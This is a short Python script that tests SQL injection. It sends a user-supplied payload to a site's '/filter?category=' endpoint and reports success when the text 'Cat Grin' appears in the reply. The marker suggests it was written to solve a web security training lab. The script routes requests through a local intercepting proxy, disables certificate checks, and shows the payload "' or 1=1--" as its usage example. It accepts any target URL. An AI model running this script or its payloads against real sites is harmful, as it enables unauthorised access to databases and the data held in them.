import requests
import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8082', 'https':'http://127.0.0.1:8082'}
def exploitsqli(url, payload):
    uri = "/filter?category="
    fullpath = url+uri+payload
    r = requests.get(fullpath,verify=False, proxies=proxies)
    if("Cat Grin" in r.text):
        return True
    else:
        return False





if __name__=="__main__":
    #Handling try and exception between cmd line and python script
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[+] Usage %s <url> <payload>" %sys.argv[0])
        print("[+] Example %s example.com ' or 1=1--" %sys.argv[0])
        sys.exit(1)

    #Handling logic of script
    if exploitsqli(url, payload) :
        print("[+] SQL Injection successful")
    else:
        print("[+] SQL Injection unsuccessful")
